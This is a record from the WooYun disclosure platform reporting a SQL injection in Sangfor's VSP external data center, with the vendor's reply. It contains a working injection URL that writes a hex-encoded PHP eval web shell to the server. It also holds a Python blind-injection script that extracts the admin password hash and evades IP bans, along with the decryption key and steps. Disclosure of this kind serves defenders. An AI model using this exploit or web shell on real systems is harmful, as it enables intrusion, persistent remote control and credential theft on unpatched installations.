{"id": 45783, "wybug_id": "wooyun-2014-087051", "wybug_title": "深信服VSP外置数据中心getshell", "wybug_corp": "深信服", "wybug_author": "f4ckbaidu", "wybug_date": "2014-12-13 23:56", "wybug_open_date": "2015-03-13 23:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向公众公开  简要描述： 和SSL VPN的外置数据中心漏洞一模一样，过了半年不修复还挂在官网上？？ 详细说明：  参考之前的： WooYun: 深信服SSL VPN外置数据中心敏感信息泄漏&SQL注入漏洞可导致getshell 一、getshell：\nhttps://localhost/src/login.php?action_c=login&user_type=1&user=admin&pass=admin&nodeid=1 and 1=2 union select 0x3c3f70687020406576616c28245f504f53545b277362275d293b3f3e into outfile 'D:\\\\Program Files\\\\Sangfor\\\\SSL\\\\LogKeeper\\\\htdocs\\\\test.php'\n\n\n二、注入获取管理员密码关门，上python\n# encoding:utf-8import requestsimport sysimport timeif len(sys.argv)<2 :\tprint \"useage: test.py target\\r\"\tprint \"example: python test.py https://192.168.222.128/\"\tsys.exit(0)target = sys.argv[1]def exploit(url,pointer) :\tpassword = \"\"\tlist = [\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\"]\twhile pointer < 17 :\t\tflag = False\t\tindex = 0\t\twhile (index < len(list)) :\t\t\tsql = \"and (select mid(sys_adt_pass,%d,1) from sys_adt where id=1)=\\\"%s\\\"\" % (pointer+1,list[index])\t\t\tresponse = requests.get(url+\"src/login.php?action_c=login&user_type=1&user=admin&pass=&nodeid=1 \"+sql,timeout=10,verify=False)\t\t\tif \"拒绝登录\" in response.content : #IP被封锁时，延迟305秒\t\t\t\tprint \"login failure exceeded 5 times,ip is banned,wait for 305 seconds to continue\"\t\t\t\ttime.sleep(305)\t\t\telif \"用户名或者密码不正确\" in response.content :\t\t\t\tprint \"password[%d]=%s\" % (pointer,list[index])\t\t\t\tpassword += list[index]\t\t\t\tbreak\t\t\telif \"连接数据库失败\" in response.content :\t\t\t\tindex += 1\t\t\telse :\t\t\t\tprint \"error,exit!\"\t\t\t\tsys.exit(0)\t\t\t\t\t\tpointer += 1\tprint(\"Admin's password is %s\") % (password)exploit(target,0)print \"done!\"\n运行效果：\n\n打开这个网站去解密http://des.online-domain-tools.com/去掉密码最后一位，key为tjf，点击decrypt就能得到明文密码\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 f4ckbaidu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-12-15 15:47 厂商回复： 感谢白帽子对深信服产品提出的建议。该漏洞已于今年6月份进行修复并发布了补丁包。此次的VSP外置数据中心存在SQL注入漏洞是由于客户未及时更新补丁包导致的。考虑到以下3点内容：1. VSP外置数据中心主要用于存放VSP相关日志，对于VSP安全性影响较低；2. VSP外置数据中心用户量较少；3. VSP数据中心部署于内网；我们将漏洞级别降低为低级。另一方面，我们的工程师正在积极联系客户，一旦联系上客户，会为其手动更新补丁包修复该漏洞。我们会给您寄出小礼物表示感谢~！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-18 17:19 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  ...    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}